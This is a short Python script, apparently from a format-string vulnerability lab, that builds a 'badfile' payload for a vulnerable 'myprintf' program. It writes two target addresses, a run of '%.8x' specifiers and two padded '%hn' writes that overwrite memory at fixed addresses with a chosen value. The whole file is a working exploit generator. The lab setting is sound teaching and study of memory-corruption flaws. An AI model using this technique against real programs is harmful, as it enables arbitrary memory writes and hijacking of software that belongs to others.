#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))
# The input buffer's address:    0xffaf2770
# Frame Pointer (inside myprintf):      0xffaf2698

# Split into 2 byte shorter numbers
number1 = 0x080e506a #upper bytes
number2  = 0x080e5068 # lower bytes
content[0:4]  =  (number1).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12]  =  (number2).to_bytes(4,byteorder='little')
# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
count = 62
D1 = 0xd71e
D2 = 0xffff - 508
s = ("%.8x"*count) + "%."+ str(D2) + "x" +"%hn" + "%."+ str(D1) + "x" +"%hn"
# + "%x."*30 "%."+ str(10)+ "x"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
